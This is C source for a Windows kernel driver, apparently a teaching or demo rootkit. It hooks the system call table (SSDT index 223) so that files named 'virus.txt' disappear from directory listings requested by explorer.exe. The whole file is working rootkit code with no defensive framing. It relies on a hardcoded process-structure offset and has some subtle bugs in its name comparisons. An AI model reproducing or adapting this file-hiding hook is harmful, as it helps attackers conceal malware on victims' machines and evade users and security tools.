#include <ntifs.h>
#include <ntddk.h>

#define DeviceName L"\\Device\\hook"
#define LnkDeviceName L"\\DosDevices\\hook" 


#pragma pack(1)
typedef struct ServiceDescriptorEntry {
        unsigned int *ServiceTableBase;
        unsigned int *ServiceCounterTableBase; 
        unsigned int NumberOfServices;
        unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()
__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

PMDL  g_pmdlSystemCall;
PVOID *MappedSystemCallTable;
int IsHooked;

typedef struct ProcessInformation{
	ULONG pid;
	ULONG ppid;
	UCHAR *name;
	PUNICODE_STRING pathname;
} ProcessInformation;

NTSYSAPI
NTSTATUS
NTAPI ZwQueryInformationProcess(
  __in       HANDLE ProcessHandle,
  __in       PROCESSINFOCLASS ProcessInformationClass,
  __out      PVOID ProcessInformation,
  __in       ULONG ProcessInformationLength,
  __out_opt  PULONG ReturnLength
);

NTSYSAPI
NTSTATUS
NTAPI NtCreateFile(
);

NTSYSAPI
NTSTATUS
NTAPI ZwQueryDirectoryFile
(
  IN    HANDLE FileHandle,
  IN	HANDLE Event,
  IN	PIO_APC_ROUTINE ApcRoutine,
  IN	PVOID ApcContext,
  OUT   PIO_STATUS_BLOCK IoStatusBlock,
  OUT   PVOID FileInformation,
  IN    ULONG Length,
  IN    FILE_INFORMATION_CLASS FileInformationClass,
  IN    BOOLEAN ReturnSingleEntry,
  IN	PUNICODE_STRING FileName,
  IN    BOOLEAN RestartScan
);

typedef NTSTATUS  (*ZwQueryDirectoryFilePtr)
(
  IN    HANDLE FileHandle,
  IN	HANDLE Event,
  IN	PIO_APC_ROUTINE ApcRoutine,
  IN	PVOID ApcContext,
  OUT   PIO_STATUS_BLOCK IoStatusBlock,
  OUT   PVOID FileInformation,
  IN    ULONG Length,
  IN    FILE_INFORMATION_CLASS FileInformationClass,
  IN    BOOLEAN ReturnSingleEntry,
  IN	PUNICODE_STRING FileName,
  IN    BOOLEAN RestartScan
);

ZwQueryDirectoryFilePtr OldZwQueryDirectoryFile;

PVOID getDirEntryFileName
(
	IN PVOID FileInformation,
	IN FILE_INFORMATION_CLASS FileInfoClass
)
{
    PVOID result = 0;
    switch(FileInfoClass){
        case FileDirectoryInformation:
            result = (PVOID)&((PFILE_DIRECTORY_INFORMATION)FileInformation)->FileName;
            break;
        case FileFullDirectoryInformation:
            result =(PVOID)&((PFILE_FULL_DIR_INFORMATION)FileInformation)->FileName;
            break;
        case FileIdFullDirectoryInformation:
            result =(PVOID)&((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileName;
            break;
        case FileBothDirectoryInformation:
            result =(PVOID)&((PFILE_BOTH_DIR_INFORMATION)FileInformation)->FileName;
            break;
        case FileIdBothDirectoryInformation:
            result =(PVOID)&((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->FileName;
            break;
        case FileNamesInformation:
            result =(PVOID)&((PFILE_NAMES_INFORMATION)FileInformation)->FileName;
            break;
    }
    return result;
}

ULONG getNextEntryOffset
(
    IN PVOID FileInformation,
    IN FILE_INFORMATION_CLASS FileInfoClass
)
{
    ULONG result = 0;
    switch(FileInfoClass) {
            case FileDirectoryInformation:
                    result = (ULONG)((PFILE_DIRECTORY_INFORMATION)FileInformation)->NextEntryOffset;
                    break;
            case FileFullDirectoryInformation:
                    result =(ULONG)((PFILE_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset;
                    break;
            case FileIdFullDirectoryInformation:
                    result =(ULONG)((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset;
                    break;
            case FileBothDirectoryInformation:
                    result =(ULONG)((PFILE_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset;
                    break;
            case FileIdBothDirectoryInformation:
                    result =(ULONG)((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset;
                    break;
            case FileNamesInformation:
                    result =(ULONG)((PFILE_NAMES_INFORMATION)FileInformation)->NextEntryOffset;
                    break;
    }
    return result;
}
 
void setNextEntryOffset
(
    IN PVOID FileInformation,
    IN FILE_INFORMATION_CLASS FileInfoClass,
	IN ULONG newValue
)
{
    switch(FileInfoClass){
            case FileDirectoryInformation:
                    ((PFILE_DIRECTORY_INFORMATION)FileInformation)->NextEntryOffset = newValue;
                    break;
            case FileFullDirectoryInformation:
                    ((PFILE_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
                    break;
            case FileIdFullDirectoryInformation:
                    ((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
                    break;
            case FileBothDirectoryInformation:
                    ((PFILE_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
                    break;
            case FileIdBothDirectoryInformation:
                    ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
                    break;
            case FileNamesInformation:
                    ((PFILE_NAMES_INFORMATION)FileInformation)->NextEntryOffset = newValue;
                    break;
    }
}

const WCHAR prefix[] = L"virus.txt";

BOOLEAN checkIfHiddenFile(WCHAR fileName[])
{
	/*UCHAR target[8];
	strncpy(target, "virus.txt", 9);
 
	if ((strncmp(fileName, target, 9)==0)) {
		return TRUE;
	}*/
	
	SIZE_T nBytesEqual;
	nBytesEqual = 0;
	nBytesEqual = RtlCompareMemory ((PVOID)&(fileName[0]), (PVOID)&(prefix[0]), 9);
	if(nBytesEqual==9) {
		return(TRUE);
	}
 
	return FALSE;
}

NTSTATUS NewZwQueryDirectoryFile(
  HANDLE                 FileHandle,
  HANDLE                 Event,
  PIO_APC_ROUTINE        ApcRoutine,
  PVOID                  ApcContext,
  PIO_STATUS_BLOCK       IoStatusBlock,
  PVOID                  FileInformation,
  ULONG                  Length,
  FILE_INFORMATION_CLASS FileInformationClass,
  BOOLEAN                ReturnSingleEntry,
  PUNICODE_STRING        FileName,
  BOOLEAN                RestartScan
)
{
	NTSTATUS ntstatus = STATUS_SUCCESS;
	PVOID	currFile;
	PVOID	prevFile;
	
	ntstatus = ((ZwQueryDirectoryFilePtr) (*OldZwQueryDirectoryFile)) (
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan
	);
	
	// behaviour of the new ZwQueryDirectoryFile (hide some particular files)
	if(!NT_SUCCESS(ntstatus))
	{
		return ntstatus;
	}
 
	if (
		FileInformationClass == FileDirectoryInformation ||
        FileInformationClass == FileFullDirectoryInformation ||
        FileInformationClass == FileIdFullDirectoryInformation ||
        FileInformationClass == FileBothDirectoryInformation ||
        FileInformationClass == FileIdBothDirectoryInformation ||
        FileInformationClass == FileNamesInformation 	 
	)
	{
		currFile =	FileInformation;
		prevFile =	NULL;
		do {
			if(strncmp((char*)PsGetCurrentProcess() + 0x16c, "explorer.exe", sizeof((char*)PsGetCurrentProcess() + 0x16c)) == 0) {
				if(checkIfHiddenFile(getDirEntryFileName(currFile,FileInformationClass))==TRUE) {
					if(getNextEntryOffset(currFile,FileInformationClass)!=0) {
						int delta;
						int nBytes;
						delta =	((ULONG)currFile) - (ULONG)FileInformation;
						nBytes = (ULONG)Length - delta;
						nBytes = nBytes - getNextEntryOffset(currFile,FileInformationClass);
						RtlCopyMemory (
							(PVOID)currFile,
							(PVOID)((char*)currFile +  getNextEntryOffset(currFile,FileInformationClass)),
							(ULONG)nBytes
						);
						continue;
					}
					else {
						if(currFile==FileInformation) {
							ntstatus = STATUS_NO_MORE_FILES;
						}
						else {
							setNextEntryOffset(prevFile,FileInformationClass,0);
						}
						break;
					}
				}
			}
			
			prevFile = currFile;
			currFile = ((char*)currFile + getNextEntryOffset(currFile,FileInformationClass));
		}
		while(getNextEntryOffset(prevFile,FileInformationClass) != 0);
	}
	
	return ntstatus;
}

NTSTATUS Hook_Function()
{
	g_pmdlSystemCall=IoAllocateMdl(KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4, 0, 0, NULL);

   	if(!g_pmdlSystemCall)
      	return STATUS_UNSUCCESSFUL;

   	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);
	
	MappedSystemCallTable=MmMapLockedPages(g_pmdlSystemCall, KernelMode);

	__try{
		OldZwQueryDirectoryFile = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[223], (LONG) NewZwQueryDirectoryFile);
		IsHooked = 1;
	}
	__except(1){
			DbgPrint("DriverEntry: Hook failed");

	}
	return STATUS_SUCCESS;
}
 
void Unhook_fonction()
{	
	__try
	{
		InterlockedExchange( (PLONG) &MappedSystemCallTable[223], (LONG) OldZwQueryDirectoryFile);
		IsHooked = 0;
	}
	__except(1){
			DbgPrint("DriverEntry: Unhook failed");
	}
 
    // Unlock and Free MDL
	if(g_pmdlSystemCall)
	{
		MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
		IoFreeMdl(g_pmdlSystemCall);
	}
	DbgPrint("Unhook Function \n");
}
 

NTSTATUS DriverDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
	}

NTSTATUS DriverCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
}


NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING usLnkName;
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
    IoDeleteSymbolicLink(&usLnkName);
	if(IsHooked)
		Unhook_fonction();

    IoDeleteDevice(DriverObject->DeviceObject);
	DbgPrint("Bye !!\n");
	return STATUS_SUCCESS;
}




NTSTATUS DriverEntry(PDRIVER_OBJECT  pDriverObject, PUNICODE_STRING  pRegistryPath)
{
	ULONG i,NtStatus;
	PDEVICE_OBJECT pDeviceObject=NULL;
	UNICODE_STRING usDriverName,usLnkName;

	DbgPrint("Hello from KernelLand master\n");
	
	for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
	pDriverObject->MajorFunction[i]=DriverDispatch;

	pDriverObject->MajorFunction[IRP_MJ_CREATE]=DriverCreate; 
	
	RtlInitUnicodeString(&usDriverName,DeviceName);
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
	
	NtStatus=IoCreateDevice(pDriverObject,
							0, 
	 						&usDriverName, 
	 						FILE_DEVICE_UNKNOWN, 
	 						FILE_DEVICE_SECURE_OPEN, 
	 						FALSE, 
	 						&pDeviceObject);
	if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateDevice()");

	
	NtStatus=IoCreateSymbolicLink(&usLnkName,&usDriverName);
		if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateSymbolicLink()");
	
	pDriverObject->DriverUnload=DriverUnload;

	Hook_Function();

	return STATUS_SUCCESS;	
}